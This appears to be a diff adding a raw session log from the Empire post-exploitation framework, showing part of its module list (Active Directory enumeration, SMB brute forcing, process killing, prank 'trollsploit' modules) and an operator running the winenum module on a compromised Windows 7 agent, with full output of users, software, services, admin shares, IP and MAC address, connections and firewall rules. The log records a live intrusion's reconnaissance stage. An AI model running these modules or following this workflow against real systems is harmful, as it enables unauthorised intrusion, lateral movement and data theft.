+situational_awareness/network/powerview/find_managed_security_group
+situational_awareness/network/powerview/find_user_field
+situational_awareness/network/powerview/get_cached_rdpconnection
+situational_awareness/network/powerview/get_computer
+situational_awareness/network/powerview/get_dfs_share
+situational_awareness/network/powerview/get_domain_controller
+situational_awareness/network/powerview/get_domain_policy
+situational_awareness/network/powerview/get_domain_trust
+situational_awareness/network/powerview/get_fileserver
+situational_awareness/network/powerview/get_forest
+situational_awareness/network/powerview/get_forest_domain
+situational_awareness/network/powerview/get_gpo
+situational_awareness/network/powerview/get_gpo_computer
+situational_awareness/network/powerview/get_group
+situational_awareness/network/powerview/get_group_member
+situational_awareness/network/powerview/get_localgroup
+situational_awareness/network/powerview/get_loggedon
+situational_awareness/network/powerview/get_object_acl
+situational_awareness/network/powerview/get_ou
+situational_awareness/network/powerview/get_rdp_session
+situational_awareness/network/powerview/get_session
+situational_awareness/network/powerview/get_site
+situational_awareness/network/powerview/get_subnet
+situational_awareness/network/powerview/get_user
+situational_awareness/network/powerview/map_domain_trust
+situational_awareness/network/powerview/process_hunter
+situational_awareness/network/powerview/set_ad_object
+situational_awareness/network/powerview/share_finder
+situational_awareness/network/powerview/user_hunter
+situational_awareness/network/reverse_dns
+situational_awareness/network/smbautobrute
+situational_awareness/network/smbscanner
+trollsploit/message
+trollsploit/process_killer
+trollsploit/rick_ascii
+trollsploit/rick_astley
+trollsploit/thunderstruck
+trollsploit/voicetroll
+trollsploit/wallpaper
+reness/host/winenum/get_domain_sid) > usemodule situational_awa 
+(Empire: situational_awareness/host/winenum) > info
+
+           Name: Invoke-WinEnum
+         Module: situational_awareness/host/winenum
+     NeedsAdmin: False
+      OpsecSafe: True
+   MinPSVersion: 2
+     Background: True
+OutputExtension: None
+
+Authors:
+  @xorrior
+
+Description:
+  Collects revelant information about a host and the current
+  user context.
+
+Options:
+
+  Name     Required    Value                     Description
+  ----     --------    -------                   -----------
+  Keywords False                                 Array of keywords to use in file        
+                                                 searches.                               
+  UserName False                                 UserName to enumerate. Defaults to the  
+                                                 current user context.                   
+  Agent    True        RBH21WLMXZGPTSSK          Agent to run module on.                 
+
+(Empire: situational_awareness/host/winenum) > execute
+(Empire: situational_awareness/host/winenum) > 
+Job started: Debug32_9os4z
+
+UserName: Administrator
+
+-------------------------------------
+AD Group Memberships
+-------------------------------------
+
+-------------------------------------
+Password Last changed
+-------------------------------------
+
+
+-------------------------------------
+Last 5 files opened
+-------------------------------------
+
+
+
+
+-------------------------------------
+Interesting Files
+-------------------------------------
+
+
+
+
+-------------------------------------
+Clipboard Contents
+-------------------------------------
+
+
+-------------------------------------
+System Information
+-------------------------------------
+OS: Microsoft Windows 7 Professional  64-bit
+
+
+
+
+DisplayName                                                   
+-----------                                                   
+                                                              
+                                                              
+Google Chrome                                                 
+Google Update Helper                                          
+Java Auto Updater                                             
+Java(TM) 6 Update 45                                          
+Java(TM) SE Development Kit 6 Update 45                       
+Microsoft Office Access MUI (English) 2010                    
+Microsoft Office Access Setup Metadata MUI (English) 2010     
+Microsoft Office Excel MUI (English) 2010                     
+Microsoft Office Groove MUI (English) 2010                    
+Microsoft Office InfoPath MUI (English) 2010                  
+Microsoft Office OneNote MUI (English) 2010                   
+Microsoft Office Outlook MUI (English) 2010                   
+Microsoft Office PowerPoint MUI (English) 2010                
+Microsoft Office Professional Plus 2010                       
+Microsoft Office Professional Plus 2010                       
+Microsoft Office Proof (English) 2010                         
+Microsoft Office Proof (French) 2010                          
+Microsoft Office Proof (Spanish) 2010                         
+Microsoft Office Proofing (English) 2010                      
+Microsoft Office Publisher MUI (English) 2010                 
+Microsoft Office Shared MUI (English) 2010                    
+Microsoft Office Shared Setup Metadata MUI (English) 2010     
+Microsoft Office Word MUI (English) 2010                      
+Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148
+Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.40649  
+Mozilla Maintenance Service                                   
+Mozilla Thunderbird 45.8.0 (x86 en-US)                        
+WinPcap 4.1.3                                                 
+Wireshark 2.2.5 (64-bit)                                      
+
+
+
+DisplayName                                                   
+-----------                                                   
+                                                              
+                                                              
+Google Chrome                                                 
+Google Update Helper                                          
+Java Auto Updater                                             
+Java(TM) 6 Update 45                                          
+Java(TM) SE Development Kit 6 Update 45                       
+Microsoft Office Access MUI (English) 2010                    
+Microsoft Office Access Setup Metadata MUI (English) 2010     
+Microsoft Office Excel MUI (English) 2010                     
+Microsoft Office Groove MUI (English) 2010                    
+Microsoft Office InfoPath MUI (English) 2010                  
+Microsoft Office OneNote MUI (English) 2010                   
+Microsoft Office Outlook MUI (English) 2010                   
+Microsoft Office PowerPoint MUI (English) 2010                
+Microsoft Office Professional Plus 2010                       
+Microsoft Office Professional Plus 2010                       
+Microsoft Office Proof (English) 2010                         
+Microsoft Office Proof (French) 2010                          
+Microsoft Office Proof (Spanish) 2010                         
+Microsoft Office Proofing (English) 2010                      
+Microsoft Office Publisher MUI (English) 2010                 
+Microsoft Office Shared MUI (English) 2010                    
+Microsoft Office Shared Setup Metadata MUI (English) 2010     
+Microsoft Office Word MUI (English) 2010                      
+Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148
+Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.40649  
+Mozilla Maintenance Service                                   
+Mozilla Thunderbird 45.8.0 (x86 en-US)                        
+WinPcap 4.1.3                                                 
+Wireshark 2.2.5 (64-bit)                                      
+
+
+
+-------------------------------------
+Services
+-------------------------------------
+
+WARNING: column "ServiceName" does not fit into the display and was removed.
+
+ServicePathtoExe                                                               
+----------------                                                               
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\alg.exe                                                    
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted               
+C:\Windows\system32\svchost.exe -k AxInstSVGroup                               
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork                       
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k bthsvcs                                     
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe                     
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe                   
+C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC7...
+C:\Windows\system32\svchost.exe -k NetworkService                              
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\system32\svchost.exe -k DcomLaunch                                  
+C:\Windows\system32\svchost.exe -k defragsvc                                   
+C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted               
+C:\Windows\system32\svchost.exe -k NetworkService                              
+C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork                       
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\lsass.exe                                                  
+C:\Windows\ehome\ehRecvr.exe                                                   
+C:\Windows\ehome\ehsched.exe                                                   
+C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted               
+C:\Windows\system32\svchost.exe -k LocalService                                
+C:\Windows\system32\fxssvc.exe                                                 
+C:\Windows\system32\svchost.exe -k LocalService                                
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe        
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc                   
+"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /medsvc                
+C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted               
+"C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\...
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k NetSvcs                                     
+C:\Windows\system32\lsass.exe                                                  
+C:\Windows\System32\svchost.exe -k NetworkServiceAndNoImpersonation            
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k NetworkService                              
+C:\Windows\System32\svchost.exe -k LocalService                                
+C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted               
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+"C:\Program Files (x86)\Microsoft Office\Office14\GROOVE.EXE" /auditservice    
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+"C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"    
+C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork                       
+C:\Windows\System32\msdtc.exe                                                  
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\msiexec.exe /V                                             
+C:\Windows\System32\svchost.exe -k NetworkService                              
+C:\Windows\system32\lsass.exe                                                  
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k LocalService                                
+"C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\...
+C:\Windows\System32\svchost.exe -k NetworkService                              
+C:\Windows\system32\svchost.exe -k LocalService                                
+"C:\Program Files (x86)\Common Files\Microsoft Shared\Source Engine\OSE.EXE"   
+"C:\Program Files\Common Files\Microsoft Shared\OfficeSoftwareProtectionPlat...
+C:\Windows\System32\svchost.exe -k LocalServicePeerNet                         
+C:\Windows\System32\svchost.exe -k LocalServicePeerNet                         
+C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k PeerDist                                    
+C:\Windows\SysWow64\perfhost.exe                                               
+C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork                       
+C:\Windows\system32\svchost.exe -k DcomLaunch                                  
+C:\Windows\System32\svchost.exe -k LocalServicePeerNet                         
+C:\Windows\System32\svchost.exe -k LocalServicePeerNet                         
+C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted             
+C:\Windows\system32\svchost.exe -k DcomLaunch                                  
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\lsass.exe                                                  
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k regsvc                                      
+"C:\Program Files (x86)\WinPcap\rpcapd.exe" -d -f "C:\Program Files (x86)\Wi...
+C:\Windows\system32\svchost.exe -k RPCSS                                       
+C:\Windows\system32\locator.exe                                                
+C:\Windows\system32\svchost.exe -k rpcss                                       
+C:\Windows\system32\lsass.exe                                                  
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k SDRSVC                                      
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\snmptrap.exe                                               
+C:\Windows\System32\spoolsv.exe                                                
+C:\Windows\system32\sppsvc.exe                                                 
+C:\Windows\system32\svchost.exe -k LocalService                                
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\system32\svchost.exe -k LocalService                                
+C:\Windows\system32\svchost.exe -k imgsvc                                      
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k swprv                                       
+C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k NetworkService                              
+C:\Windows\System32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\System32\svchost.exe -k NetworkService                              
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k LocalService                                
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\servicing\TrustedInstaller.exe                                      
+C:\Windows\system32\UI0Detect.exe                                              
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\system32\lsass.exe                                                  
+C:\Windows\System32\vds.exe                                                    
+"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"         
+"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                            
+C:\Windows\system32\dllhost.exe /Processid:{FB70C6A8-ADA8-4F07-B327-D8D0B0A7...
+C:\Windows\system32\vssvc.exe                                                  
+C:\Windows\system32\svchost.exe -k LocalService                                
+"C:\Windows\system32\wbengine.exe"                                             
+C:\Windows\system32\svchost.exe -k WbioSvcGroup                                
+C:\Windows\System32\svchost.exe -k LocalServiceAndNoImpersonation              
+C:\Windows\system32\svchost.exe -k wcssvc                                      
+C:\Windows\System32\svchost.exe -k LocalService                                
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\system32\svchost.exe -k LocalService                                
+C:\Windows\system32\svchost.exe -k NetworkService                              
+C:\Windows\System32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k WerSvcGroup                                 
+C:\Windows\System32\svchost.exe -k secsvcs                                     
+C:\Windows\system32\svchost.exe -k LocalService                                
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\System32\svchost.exe -k NetworkService                              
+C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\system32\wbem\WmiApSrv.exe                                          
+"C:\Program Files\Windows Media Player\wmpnetwk.exe"                           
+C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted               
+C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted               
+C:\Windows\system32\SearchIndexer.exe /Embedding                               
+C:\Windows\system32\svchost.exe -k netsvcs                                     
+C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                
+C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork                       
+
+
+
+-------------------------------------
+Available Shares
+-------------------------------------
+
+Name   Path       Description   Status
+----   ----       -----------   ------
+ADMIN$ C:\Windows Remote Admin  OK    
+C$     C:\        Default share OK    
+IPC$              Remote IPC    OK    
+
+
+
+-------------------------------------
+AV Solution
+-------------------------------------
+
+-------------------------------------
+Windows Last Updated
+-------------------------------------
+
+
+
+Unknown
+
+-------------------------------------
+Network Adapters
+-------------------------------------
+
+Adapter: Intel(R) PRO/1000 MT Network Connection
+
+IP Address: 192.168.4.38
+
+Mac Address: 00:0C:29:9C:D9:89
+
+-------------------------------------
+Netstat Established connections and processes
+-------------------------------------
+ProcessName   : jusched
+LocalAddress  : 192.168.4.38
+LocalPort     : 49209
+RemoteAddress : 23.197.75.128
+RemotePort    : 443
+State         : ESTABLISHED
+
+ProcessName   : jucheck
+LocalAddress  : 192.168.4.38
+LocalPort     : 49210
+RemoteAddress : 23.197.75.128
+RemotePort    : 443
+State         : ESTABLISHED
+
+
+-------------------------------------
+Mapped Network Drives
+-------------------------------------
+
+-------------------------------------
+Firewall Rules
+-------------------------------------
+Current Firewall Profile Type in use: Private
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 5353
+ApplicationName : Google Chrome (mDNS-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Network Discovery (SSDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Network Discovery (SSDP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Network Discovery (UPnPHost-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : Network Discovery (WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : Network Discovery (WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5355
+ApplicationName : Network Discovery (LLMNR-UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5355
+LocalPort       : *
+ApplicationName : Network Discovery (LLMNR-UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : Network Discovery (Pub-WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : Network Discovery (Pub WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5355
+ApplicationName : File and Printer Sharing (LLMNR-UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5355
+LocalPort       : *
+ApplicationName : File and Printer Sharing (LLMNR-UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : SNAC Service
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : SNAC Service
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : SMC Service
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : SMC Service
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 6004
+ApplicationName : Microsoft Office Outlook
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Microsoft OneNote
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Microsoft OneNote
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Microsoft SharePoint Workspace
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Microsoft SharePoint Workspace
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 3389
+ApplicationName : Remote Desktop (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 443
+LocalPort       : *
+ApplicationName : BranchCache Hosted Cache Client (HTTP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 443
+ApplicationName : BranchCache Hosted Cache Server(HTTP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 443
+ApplicationName : BranchCache Hosted Cache Server (HTTP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : BranchCache Peer Discovery (WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : BranchCache Peer Discovery (WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 80
+LocalPort       : *
+ApplicationName : BranchCache Content Retrieval (HTTP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 80
+ApplicationName : BranchCache Content Retrieval (HTTP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Wireless Portable Devices (UPnPHost-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Wireless Portable Devices (UPnP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2869
+ApplicationName : Wireless Portable Devices (UPnP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Wireless Portable Devices (SSDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Wireless Portable Devices (SSDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Wireless Portable Devices (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Wireless Portable Devices (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5358
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (WSD EventsSecure-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5358
+ApplicationName : Connect to a Network Projector (WSD EventsSecure-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5357
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (WSD Events-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5357
+ApplicationName : Connect to a Network Projector (WSD Events-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : Connect to a Network Projector (WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 5358
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (WSD EventsSecure-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 5358
+ApplicationName : Connect to a Network Projector (WSD EventsSecure-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 5357
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (WSD Events-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 5357
+ApplicationName : Connect to a Network Projector (WSD Events-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Connect to a Network Projector (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Media Center Extenders - UPnP (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Media Center Extenders - Media Streaming (UDP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Media Center Extenders - Device Validation (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Media Center Extenders - Media Streaming (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2869
+ApplicationName : Media Center Extenders - Media Streaming (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Media Center Extenders - Device Provisioning (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Media Center Extenders - Service (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Media Center Extenders - WMDRM-ND/RTP/RTCP (UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 7777,7778,7779,7780,7781,5004,5005,50004,50005,50006,50007,50
+                  008,50009,50010,50011,50012,50013
+ApplicationName : Media Center Extenders - WMDRM-ND/RTP/RTCP (UDP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3390
+ApplicationName : Media Center Extenders - XSP (TCP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 10244
+ApplicationName : Media Center Extenders - HTTP Streaming (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 2177
+LocalPort       : *
+ApplicationName : Media Center Extenders - qWave (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2177
+ApplicationName : Media Center Extenders - qWave (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 2177
+LocalPort       : *
+ApplicationName : Media Center Extenders - qWave (UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2177
+ApplicationName : Media Center Extenders - qWave (UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Media Center Extenders - RTSP (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 554,8554,8555,8556,8557,8558
+ApplicationName : Media Center Extenders - RTSP (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Media Center Extenders - SSDP (UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Media Center Extenders - SSDP (UDP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 1688
+ApplicationName : Key Management Service (TCP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1688
+ApplicationName : Key Management Service (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (PNRP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 3540
+ApplicationName : Remote Assistance (PNRP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (SSDP TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2869
+ApplicationName : Remote Assistance (SSDP TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Remote Assistance (SSDP UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Remote Assistance (SSDP UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (TCP-In)
+
